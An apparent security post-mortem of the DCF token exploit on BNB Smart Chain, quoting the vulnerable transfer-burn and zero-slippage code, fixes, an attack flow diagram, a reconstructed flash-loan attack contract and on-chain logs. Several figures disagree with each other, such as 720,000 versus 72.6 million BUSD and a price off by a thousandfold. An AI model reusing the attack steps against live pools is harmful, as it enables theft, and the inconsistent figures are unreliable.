# DCF Token — Missing Slippage Protection & Transfer Logic Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-24 |
| **Protocol** | DCF Token |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | $442,028.61 BUSD |
| **Attacker** | [0x00c5...60ff](https://bscscan.com/address/0x00c58434F247DFdCA49b9EE82f3013BAC96F60FF) |
| **Attack Contract** | [0x77aB...7589](https://bscscan.com/address/0x77aB960503659711498A4C0BC99a84e8D0A47589) |
| **Attack Tx** | [0xb375...6fd](https://bscscan.com/tx/0xb375932951c271606360b6bf4287d080c5601f4f59452b0484ea6c856defd6fd) |
| **Vulnerable Contract** | [0xa7e9...1adb](https://bscscan.com/address/0xa7e92345ddf541aa5cf60fee2a0e721c50ca1adb) (DCF Token) |
| **Attack Block** | [44290970](https://bscscan.com/block/44290970) |
| **Root Cause** | Missing slippage protection + forced token burn inside LP pair during transfer, enabling unlimited price manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/DCF_exp.sol) |

---

## 1. Vulnerability Overview

The DCF Token contract automatically performs three actions inside the `_transfer` function whenever tokens are sold (i.e., transferred to `pairAddress`):

1. **Fee collection**: Swap 5% of the transfer amount into USDT
2. **Liquidity addition**: Use half of the acquired USDT to buy DCT tokens and add liquidity to the USDT-DCT pool
3. **LP pair burn**: Directly burn DCF tokens from the BUSD-DCF pair address at the `deadCfg` ratio, then call `sync()`

The core issue lies in **step 3, the LP burn**. The attacker transfers a small amount of DCF (83.74 DCF) to the BUSD-DCF pair to trigger the burn logic, which cuts the pair's DCF reserve in half and causes the DCF price relative to BUSD reserves to skyrocket astronomically. At this point, the attacker sells 4,039 pre-purchased DCF back into the pair and withdraws 720,000 BUSD — and there is **no slippage protection (minimum output amount check) anywhere in this process**.

Additionally, when `addLiquidity` is called, `amountMin` is set to `0`, meaning liquidity is added at the unfavorable ratio immediately after the price manipulation.

---

## 2. Vulnerable Code Analysis

### 2.1 Forced LP Pair Burn — Core Vulnerability

```solidity
// ❌ Vulnerable code — DCF Token contract _transfer function (executed on sell)
function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(
        !blackAddress[from] || !blackAddress[to],
        "black address not transfer"
    );

    if (amount == 0 || whiteAddress[from] || whiteAddress[to]) {
        super._transfer(from, to, amount);
        return;
    }

    // Block buys (transfers from pairAddress → user are forbidden)
    if (from == pairAddress) {
        require(false, "buy error");
    }

    // Detect sell: fee + burn triggered when transferring to pairAddress
    if (to == pairAddress && !swapping) {
        swapping = true;
        uint256 fee = (amount * 5) / 100;
        uint256 deadAmount = (amount - fee) / deadCfg; // ❌ deadCfg = 2: half of remaining amount

        amount -= fee;
        super._transfer(from, address(this), fee);

        uint256 initialUsdtBalance = IERC20(USDT).balanceOf(helperAddress);
        swapTokensForUSDT(fee, helperAddress);  // fee → USDT swap
        uint256 newUsdtBalance = IERC20(USDT).balanceOf(helperAddress) - initialUsdtBalance;

        // ❌ No slippage protection in addLiquidity (amountMin = 0)
        liquidityHelper.addLiquidity(newUsdtBalance);
        swapping = false;

        // ❌ Core issue: directly burn DCF from pair address + call sync()
        //    Burn amount = deadAmount itself, not (pair's current DCF balance - deadAmount)
        //    Attacker can repeatedly trigger this burn with a small transfer
        if (balanceOf(pairAddress) > deadAmount) {
            burnPair(deadAmount);
        }
    }

    super._transfer(from, to, amount);
}

// ❌ Vulnerable burnPair — burns tokens from pair and immediately forces sync
function burnPair(uint256 _deadAmount) private {
    if (_deadAmount > 0) {
        _burn(pairAddress, _deadAmount);  // ❌ Forcibly reduces pair's balanceOf
    }
    IUniswapV2Pair(pairAddress).sync();   // ❌ Updates reserve with reduced balance → price spikes
}
```

**Issues**:
- `_burn(pairAddress, deadAmount)`: Directly burning the token balance held by the AMM pair address creates a discrepancy between the tokens the pair actually holds and its internal `reserve`.
- `sync()`: After the burn, calling `sync()` causes the pair to update its `reserve` to the current balance (the reduced post-burn value).
- This results in **the BUSD/DCF ratio spiking dramatically** (DCF becomes extremely scarce relative to BUSD), and depositing a large amount of DCF into the pair at this moment allows a mathematically disproportionate amount of BUSD to be withdrawn.
- Because there is no slippage protection, there is no mechanism to stop this process.

---

### 2.2 Missing Slippage Protection in Liquidity Addition

```solidity
// ❌ Vulnerable LiquidityHelper.addLiquidity
function addLiquidity(uint256 _usdtAmount) external onlyOwner {
    uint256 half = _usdtAmount / 2;
    uint256 otherHalf = _usdtAmount - half;

    // USDT → DCT swap: amountsOutMin = 0 ❌
    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        half,
        0,          // ❌ minAmountOut = 0: no minimum output validation
        path,
        address(this),
        block.timestamp
    );

    // USDT + DCT liquidity addition: amountMin = 0, 0 ❌
    uniswapV2Router.addLiquidity(
        USDT,
        DCT,
        otherHalf,
        newDctBalance,
        0,          // ❌ amountAMin = 0: no minimum token A amount validation
        0,          // ❌ amountBMin = 0: no minimum token B amount validation
        liquidityReceiveAddress,
        block.timestamp
    );
}
```

---

### 2.3 Fixed Code

```solidity
// ✅ Fixed _transfer — LP burn logic removed and slippage protection added
function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(
        !blackAddress[from] || !blackAddress[to],
        "black address not transfer"
    );

    if (amount == 0 || whiteAddress[from] || whiteAddress[to]) {
        super._transfer(from, to, amount);
        return;
    }

    if (from == pairAddress) {
        require(false, "buy error");
    }

    if (to == pairAddress && !swapping) {
        swapping = true;
        uint256 fee = (amount * 5) / 100;
        amount -= fee;
        super._transfer(from, address(this), fee);

        uint256 initialUsdtBalance = IERC20(USDT).balanceOf(helperAddress);
        swapTokensForUSDT(fee, helperAddress);
        uint256 newUsdtBalance = IERC20(USDT).balanceOf(helperAddress) - initialUsdtBalance;

        // ✅ Pass slippage parameter to addLiquidity (allow max 2% price impact)
        liquidityHelper.addLiquidity(newUsdtBalance, maxSlippageBps);
        swapping = false;

        // ✅ LP pair direct burn logic completely removed
        //    If token burning is required, burn to address(0xdead) without calling sync directly
    }

    super._transfer(from, to, amount);
}

// ✅ Fixed LiquidityHelper.addLiquidity
function addLiquidity(uint256 _usdtAmount, uint256 _maxSlippageBps) external onlyOwner {
    uint256 half = _usdtAmount / 2;
    uint256 otherHalf = _usdtAmount - half;

    // ✅ Calculate expected output amount
    uint256 expectedDct = getAmountOut(half, USDT, DCT);
    uint256 minDct = (expectedDct * (10000 - _maxSlippageBps)) / 10000; // ✅ Apply slippage limit

    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        half,
        minDct,     // ✅ Set minimum output amount
        path,
        address(this),
        block.timestamp
    );

    uint256 newDctBalance = ERC20(DCT).balanceOf(address(this)) - initialBalance;
    uint256 minUSDT = (otherHalf * (10000 - _maxSlippageBps)) / 10000;  // ✅
    uint256 minDctLP = (newDctBalance * (10000 - _maxSlippageBps)) / 10000; // ✅

    uniswapV2Router.addLiquidity(
        USDT,
        DCT,
        otherHalf,
        newDctBalance,
        minUSDT,    // ✅ Minimum USDT amount validation
        minDctLP,   // ✅ Minimum DCT amount validation
        liquidityReceiveAddress,
        block.timestamp
    );
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (EOA: `0x00c5...60ff`) pre-acquires some DCF tokens (`from: 0x00c5...` → transfers 83.74 DCF to the attack contract)
- Attack contract (`0x77aB...7589`) deployed
- Borrows **221,271,336 BUSD total** via a recursive flash loan structure across 15 PancakeSwap V3 pools (using callback mechanism)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x00c5...60ff)                                        │
│  → Calls attack contract (0x77aB...7589): attack(DCF_contract)       │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 1] Flash Loan — Recursive calls across 15 PancakeSwap V3 pools│
│  Borrow: 221,271,336 BUSD (nested execution via flash loan callbacks) │
└──────────────────────────┬──────────────────────────────────────────┘
                           │ Receive 221M BUSD
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 2] Buy DCF — BUSD-DCF PancakeSwap V2 pair                    │
│  80,435,691 BUSD → 4,039.27 DCF purchased                           │
│  Recipient: 0x16600100... (attacker's temporary address)             │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 3] Buy DCT — BUSD-DCT PancakeSwap V2 pair                    │
│  29,919,669 BUSD → 1,062,693.42 DCT purchased                       │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 4] Trigger Price Manipulation — Exploit DCF _transfer flaw   │
│  Attacker → transfers 83.74 DCF (small amount) to BUSD-DCF pair     │
│                                                                     │
│  Automatic execution inside _transfer:                              │
│    ① Collect 5% fee → swap to USDT                                  │
│    ② addLiquidity(newUSDT) → add liquidity to USDT-DCT pool         │
│    ③ burnPair(deadAmount):                                           │
│       • Burn ~2,037 DCF from BUSD-DCF pair (half burned)            │
│       • Call sync() → recalculate pair reserves                     │
│                                                                     │
│  [Result] BUSD-DCF pair reserve changes:                            │
│    Before: BUSD 698,634 / DCF 4,074                                 │
│    Burned: ~2,037 DCF burned                                        │
│    After:  BUSD 81,134,325 / DCF 35.17 (post-sync)                 │
│    DCF price: 171 → 2,307,042,000 BUSD/DCF (×13,453,585 increase)  │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 5] Sell DCF — Dump held DCF after price spike                │
│  4,039.27 DCF → transferred to BUSD-DCF pair (re-triggers transfer) │
│  → Additional burn triggered then sync                              │
│  → 72,612,978.99 BUSD withdrawn                                     │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 6] Sell DCT — Close arbitrage position from USDT-DCT pool    │
│  1,062,693.42 DCT → 38,302,987.02 BUSD withdrawn                   │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [Step 7] Repay Flash Loans — Return principal to 15 PancakeSwap V3 pools │
│  Repaid: 220,829,307.92 BUSD                                        │
│                                                                     │
│  Net profit: 442,028.61 BUSD                                        │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Results

| Item | Amount |
|------|------|
| Total flash loan borrowed | 221,271,336 BUSD |
| Withdrawn from DCF pair | 72,612,978.99 BUSD |
| Withdrawn from DCT pair | 38,302,987.02 BUSD |
| Flash loan repaid | ~220,829,307 BUSD |
| **Attacker net profit** | **$442,028.61 BUSD** |
| Protocol loss | BUSD-DCF liquidity drained + DCT pool loss |

---

## 4. PoC Code — Core Logic (Reconstructed from DeFiHackLabs)

```solidity
// Attack contract core logic (reconstructed)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// Entry point: executed inside flash loan callback
function _flashLoanCallback(uint256 borrowedBusd) internal {
    // [Step 2] Buy DCF with BUSD (to attacker's temporary address)
    BUSD.transfer(BUSD_DCF_PAIR, 80_435_691e18);
    BUSD_DCF_PAIR.swap(4039e18, 0, tempAddress, "");
    // Retrieve DCF from temp address back to attack contract
    tempAddress.transferDCFBack();

    // [Step 3] Buy DCT with BUSD
    BUSD.transfer(BUSD_DCT_PAIR, 29_919_669e18);
    BUSD_DCT_PAIR.swap(0, 1_062_693e18, address(this), "");

    // [Step 4] Core: trigger price manipulation with small DCF transfer
    // DCF._transfer internally executes burnPair + sync
    DCF.transfer(BUSD_DCF_PAIR, 83.74e18);
    // → At this point the BUSD-DCF pair's DCF reserve collapses to ~35 tokens
    // → DCF price = 81,134,325 BUSD / 35 DCF ≈ 2.32M BUSD/DCF

    // [Step 5] Sell the 4,039 DCF at the manipulated price
    // Calling DCF.transfer(BUSD_DCF_PAIR, ...) again triggers additional burn
    DCF.transfer(address(this), 4039e18); // retrieve from temp address
    DCF.transfer(BUSD_DCF_PAIR, 78.62e18);
    // Withdraw the remaining 72,612,978 BUSD from the pair
    BUSD_DCF_PAIR.swap(72_612_978e18, 0, address(this), "");

    // [Step 6] Sell held DCT
    DCT.transfer(BUSD_DCT_PAIR, 1_062_693e18);
    BUSD_DCT_PAIR.swap(38_302_987e18, 0, address(this), "");

    // [Step 7] Repay flash loans and lock in profit
    repayFlashLoans();
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Direct LP pair burn + forced price manipulation via sync() | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | Missing slippage protection (amountMin = 0) | CRITICAL | CWE-20 (Improper Input Validation) |
| V-03 | Complex side effects during transfer (reentrancy-like pattern) | HIGH | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-04 | Price manipulation possible within flash loan (spot price vulnerable within single tx) | HIGH | CWE-362 (Race Condition) |

### V-01: Direct LP Pair Burn + Forced Price Manipulation via sync()

- **Description**: The `_transfer` function calls `_burn(pairAddress, deadAmount)` on a sell, directly reducing the token balance held by the pair contract, then immediately calls `sync()` to update the reserve to the deflated balance. This is equivalent to arbitrarily manipulating the `reserve` values of a Uniswap V2 pair.
- **Impact**: In the AMM x\*y=k formula, when y (DCF reserve) decreases to an extreme, the DCF price must skyrocket to maintain k for the same x (BUSD). Depositing pre-purchased DCF into the pair at this moment allows BUSD to be withdrawn at a grossly disproportionate ratio.
- **Attack Conditions**: (1) Holding a small amount of DCF, (2) securing a large BUSD amount via flash loan, (3) executing a sell transaction (transfer to pairAddress)

### V-02: Missing Slippage Protection (amountMin = 0)

- **Description**: Both the `swapExactTokensForTokensSupportingFeeOnTransferTokens` call and the `addLiquidity` call within `LiquidityHelper.addLiquidity()` are set with `amountOutMin = 0`, `amountAMin = 0`, and `amountBMin = 0`. This means swaps and liquidity additions execute under any price condition.
- **Impact**: Even if the protocol's `addLiquidity` executes mid-price manipulation, it cannot be stopped. Liquidity is added at the worst possible ratio, resulting in additional fund losses.
- **Attack Conditions**: Automatically triggered inside `_transfer`, so any sell transaction satisfies the condition

### V-03: Complex Side Effects During Transfer

- **Description**: The ERC-20 standard `_transfer` performs external contract calls beyond simple balance movement (swaps, liquidity additions, burns). While the `swapping` flag prevents reentrancy, `burnPair()` is called after the flag is cleared, changing the pair state before the original `super._transfer` executes.
- **Impact**: The ordering of transfers and state changes is mixed, causing the actual transfer to complete in an unpredictable price state.
- **Attack Conditions**: Any sell transfer transaction (to == pairAddress)

### V-04: Single-Transaction Price Manipulation via Flash Loan

- **Description**: No TWAP (time-weighted average price) oracle is used; only the current block's spot price is reflected. Manipulating the pair reserve with a flash loan makes the manipulated price valid within the same transaction.
- **Impact**: Within a single transaction: price manipulation → profit realization → restoration is entirely feasible.
- **Attack Conditions**: A flash loan pool exists and the target protocol relies on spot price

---

## 6. Remediation Recommendations

### Immediate Actions

**[Critical] Remove Direct LP Pair Burn Logic**

```solidity
// ✅ Completely remove burnPair call from _transfer
// If burning is needed, use a transfer to address(0xdead)
// → Does not change the pair's actual balance, so reserve manipulation is impossible

// Before fix (vulnerable):
if (balanceOf(pairAddress) > deadAmount) {
    burnPair(deadAmount);
}

// After fix (safe):
// Delete this entire block
// If a deflationary mechanism is required:
// super._transfer(from, address(0xdead), burnAmount); // transfer directly to burn address
```

**[Critical] Apply Slippage Protection**

```solidity
// ✅ Apply minimum output amounts to addLiquidity (e.g., allow 2% slippage)
uint256 MAX_SLIPPAGE_BPS = 200; // 2%

// For swaps
uint256 minOut = (expectedOut * (10000 - MAX_SLIPPAGE_BPS)) / 10000;
router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    half,
    minOut, // ✅ Specify minimum instead of 0
    path,
    recipient,
    block.timestamp
);

// For liquidity addition
router.addLiquidity(
    USDT, DCT,
    otherHalf, newDctBalance,
    (otherHalf * (10000 - MAX_SLIPPAGE_BPS)) / 10000, // ✅ amountAMin
    (newDctBalance * (10000 - MAX_SLIPPAGE_BPS)) / 10000, // ✅ amountBMin
    liquidityReceiveAddress,
    block.timestamp
);
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Direct LP pair burn | Prohibit the `_burn(pairAddress, ...)` pattern entirely. Burns must always target `address(0)` or `address(0xdead)` |
| Missing slippage protection | Enforce `amountMin > 0` on all DEX swap/liquidity calls. Add TWAP oracle-based price validation |
| External calls during transfer | Minimize external contract calls inside `_transfer`. Only collect fees there; separate swaps/liquidity into dedicated functions |
| Flash loan defense | Limit reserve change ratio within a single block (e.g., revert if change exceeds ±10%). Add TWAP price comparison logic |
| Buy-block logic | Replace `require(false, "buy error")` with an explicit condition (`require(from != pairAddress, "...")`) |

---

## 7. Lessons Learned

1. **Treat LP pair token balances as immutable**: Externally reducing the balance of an AMM pair contract is equivalent to reserve manipulation. The `_burn(pairAddress, ...)` pattern must never be used under any circumstances.

2. **Always apply slippage protection to DEX interactions**: `amountOutMin = 0` is never acceptable in production code. Minimum output amounts must be set even in automated internal logic (fee reinvestment, liquidity addition).

3. **Minimize side effects inside transfer functions**: ERC-20 `_transfer` should not produce external effects beyond balance changes. Complex logic such as fee swaps or liquidity additions must be separated into explicit, dedicated function calls so users can predict what a transaction will do.

4. **Validate AMM compatibility when designing deflationary tokens**: Mechanisms such as auto-burn, fee-on-transfer, and rebase can conflict with the operational mechanics of Uniswap V2/V3. The price impact on AMMs must be mathematically simulated before design is finalized.

5. **Review economic attack scenarios before auditing**: Attacks driven by economic incentive manipulation (buy tokens → manipulate price → realize arbitrage profit) are on the rise — not just syntactic code bugs. Economic model audits that include flash loan scenarios are needed from the design stage.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | Analyzed Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Total flash loan borrowed | ~221M BUSD | 221,271,336.53 BUSD (15 pools) | ✅ |
| BUSD used to buy DCF | 80,435,691 BUSD | 80,435,691.25 BUSD | ✅ |
| DCF acquired | 4,039 DCF | 4,039.27 DCF | ✅ |
| BUSD used to buy DCT | 29,919,669 BUSD | 29,919,669.28 BUSD | ✅ |
| DCT acquired | 1,062,693 DCT | 1,062,693.42 DCT | ✅ |
| DCF used to trigger manipulation | 83 DCF | 83.74 DCF | ✅ |
| BUSD withdrawn from DCF pair after manipulation | 72,612,978 BUSD | 72,612,978.99 BUSD | ✅ |
| BUSD withdrawn after selling DCT | ~38M BUSD | 38,302,987.02 BUSD | ✅ |
| **Final net profit** | **$442,028** | **$442,028.61 BUSD** | ✅ |

### 8.2 On-Chain Event Log Sequence

```
[0-14]   Transfer: 15 PancakeSwap V3 pools → attack contract (flash loan BUSD received)
[16]     Transfer: attacker → attack contract (83.74 DCF transferred)
[18]     Transfer: attack contract → BUSD-DCF pair (80,435,691 BUSD)
[20]     Transfer: BUSD-DCF pair → temporary address (4,039.27 DCF)
[21]     Sync: BUSD-DCF pair reserve updated (BUSD 81,134,325 / DCF 35.17)
[24]     Transfer: attack contract → BUSD-DCT pair (29,919,669 BUSD)
[26-29]  Transfer: BUSD-DCT pair → recipients (DCT distributed)
[30]     Sync: BUSD-DCT pair reserve updated
[32,35]  Transfer: DCF internal fee transfers
[37]     Sync: BUSD-DCF pair re-updated (BUSD 72,612,979 / DCF 39.31)
[58]     Transfer: DCF burned (39.31 DCF to address 0x0000...)
[59]     Sync: BUSD-DCF pair DCF reserve = 0 (near complete drain)
[60,62]  Transfer/Sync: additional DCF input fully manipulates pair ratio
[61]     Transfer: BUSD-DCF pair → attack contract (72,612,978.99 BUSD withdrawn)
[66,68]  Transfer/Sync: DCT → BUSD-DCT pair input
[67]     Transfer: BUSD-DCT pair → attack contract (38,302,987.02 BUSD withdrawn)
[70-84]  Transfer: attack contract → PancakeSwap V3 pools (15 flash loans repaid)
```

### 8.3 Pre-Attack State Verification (as of block 44290969)

| Item | Pre-Attack State |
|------|------------|
| Attacker BUSD balance | 0 BUSD (funds sourced entirely from flash loan) |
| BUSD-DCF pair BUSD reserve | 698,634.43 BUSD |
| BUSD-DCF pair DCF reserve | 4,074.44 DCF |
| DCF market price | 171.47 BUSD/DCF |
| BUSD-DCT pair BUSD reserve | 449,993.29 BUSD |
| BUSD-DCT pair DCT reserve | 1,112,078.80 DCT |
| DCT market price | 0.404642 BUSD/DCT |

---

*This document was prepared based on the DeFiHackLabs PoC and on-chain data (BSCScan, cast queries).*
*References: [lunaray DCF Hack Analysis](https://lunaray.medium.com/dcf-hack-analysis-dbcd3589c6fc) | [QuillAudits Analysis](https://www.quillaudits.com/blog/hack-analysis/dcf-token-hack-transfer-logic-flaw)*